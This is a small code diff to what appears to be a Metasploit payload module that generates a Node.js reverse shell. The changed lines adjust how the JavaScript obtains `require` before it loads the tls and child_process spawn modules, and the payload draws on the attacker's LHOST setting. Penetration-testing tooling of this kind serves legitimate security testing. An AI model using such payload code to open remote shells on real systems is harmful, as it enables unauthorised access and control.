@@ -49,7 +49,8 @@ module Metasploit3
     lhost = Rex::Socket.is_ipv6?(lhost) ? "[#{datastore['LHOST']}]" : datastore['LHOST']
     cmd   = <<EOS
 (function(){
-  var require = global.require || process.mainModule.constructor._load;
+  var require = global.require || global.process.mainModule.constructor._load;
+  if (!require) return;
   var tls = require("tls"),
       spawn = require("child_process").spawn,
       util = require("util"),
